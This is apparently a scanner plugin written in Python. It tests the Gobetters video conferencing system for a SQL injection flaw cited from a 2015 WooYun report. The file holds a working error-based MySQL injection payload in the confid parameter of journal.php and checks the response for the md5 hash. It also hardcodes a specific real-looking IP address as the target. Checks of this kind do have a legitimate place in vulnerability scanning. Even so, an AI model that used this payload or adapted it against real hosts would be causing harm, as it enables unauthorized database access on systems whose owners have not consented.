#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:xq17
#Name:Gobetters视频会议系统SQL注入漏洞打包
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0121825


def assign(service,arg):
    if service=="gobetter":
        return True,arg 


def  audit(arg):
    url=arg+"web/conferences/journal.php?confid=-732453%20OR%20ROW(1355,6771)>(SELECT%20COUNT(*),CONCAT((MID((IFNULL(CAST(md5(1)%20AS%20CHAR),0x20)),1,50)),FLOOR(RAND(0)*2))x%20FROM%20(SELECT%208443%20UNION%20SELECT%205201%20UNION%20SELECT%203389%20UNION%20SELECT%202860)a%20GROUP%20BY%20x)&page=2&topic=SMB%E6%B8%A0%E9%81%93%E6%9C%8D%E5%8A%A1%E6%94%BF%E7%AD%96%E8%AE%A8%E8%AE%BA-2&funid=8"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole(url)

if __name__=="__main__":
    from dummy import *
    audit(assign('gobetter','http://218.89.3.21:89/')[1])